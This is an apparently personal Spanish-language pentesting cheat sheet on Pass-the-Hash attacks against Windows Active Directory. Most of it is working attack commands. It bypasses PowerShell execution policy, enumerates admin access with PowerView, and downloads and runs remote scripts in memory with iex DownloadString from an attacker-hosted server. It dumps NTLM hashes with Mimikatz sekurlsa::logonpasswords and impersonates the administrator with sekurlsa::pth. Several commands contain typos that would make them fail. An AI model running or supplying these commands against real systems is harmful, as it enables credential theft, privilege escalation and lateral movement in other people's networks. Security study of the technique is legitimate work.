# Pass The Hash 

Tags: #AD #Windows #PassTheHash 

PtH es una técnica donde robas una credencial principalmente en los sistemas Windows. Un atacante puede obtener los hashes de las password de un usuario y usarlo para autenticarse como ese usuario, bypaseando la necesidad de la actual password en texto plano. Este ataque principalmente comienza cuando el atacante gana acceso no autorizado a un sistema comprometido donde los hashes de las password estan almacenadas. Una vez adquiridas, el atacante puede explotar la vulnerabilidad en el protocolo de autenticacion de Windows, como un NTLM o Kerberos, para pasar las credenciales hasheadas a otros sistemas dentro del dominio de AD.  Para 'bypassing' se necesita crackear la password, el atacante puede moverse lateralmente dentro de la red, escalar privilegios y potencialmente hacer actividades maliciosas.  

Los atacantes obtienen fácilmente las credenciales hasheadas para loas ataques de AD haciendo 'Pass-The-hash' por medio del dumpeo de memoria o robando hashes de contraseñas desde sistemas comprometidos.  

```bash 
❯ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1
```

```powershell
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 
 	
❯ . .\PowerView.ps1                          # Importamos el modulo
❯ Get-Domain 
❯ Find-LocalAdminAccess                      # Descubrir maquinas en el AD donde el user tiene acceso local de Admin

❯ Enter-PSSession seclogs.domian.local       # Nos autenticamos a la sesion local via remota al 'DOMINIO' 
	❯ whoami /all                           
	❯ whoami /priv                          # Miramos si tenemos los priv para elevar los privilegios

# En la maquina del DC abrimos un 'HFS' para transferir el archivo 'Invoke-TokenMalipulation.ps1' a la sesion remota 
	❯ cd /                                  # Nos dirigimos a la carpeta 'root' de la sesion remota 
	❯ iex (New-Object New.webClient).DownloadString('http://IP-HFS/Invoke-TokenMalipulation.ps1') # Descargamos en la sesion remota el modulo que se encuentra en el DC de la maquina no remota llamado 'Invoke-TokenMalipulation.ps1' por medio del 'HFS' para despues utilizarlo dentro de la misma sesion remota 
		❯ Invoke-TokenManipulation -Enumerate # Enumerara todos los token disponibles, si el 'LogonType = 2' quiere decir que el usuario admin esta loggeado
	❯ iex (New-Object New.WebClient).DownloadString('http://IP-HFS/Invoke-Mimikatz.ps1') 
		❯ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' # Nos muestra el hash NTLM de todos los usuarios asi como el del 'Admin' 
```

## Mimikatz

```powershell
# Abrimos una nueva consola de Poweshell como 'Admin'
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 
 	
❯ . .\Invoke-Mimikatz.ps1                    # Importamos el modulo 
❯ Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:<Domain> /ntlm:<hash NTLM> /run:powershell.exe"' 
# Hacemos el 'Pass-The-Hash' e ingresamos como el usuario 'Administrator'

# Despliega una nueva venta en Powershell
❯ Enter-PSSession prod.research.domian.local # Ingresamos al 'DOMINIO' via remota como el usuario Admin
```

```powershell
❯ Invoke-mimikatz -Command '"sekurlsa::pth /user:user /domain:domain1.corp /rc4:hash /run:powershell.exe"'

	# rc4 = El hash NTLM del usuario encontrado con el comando 'DumpCreds'
	# sekurlsa = Pass-The-Hash
```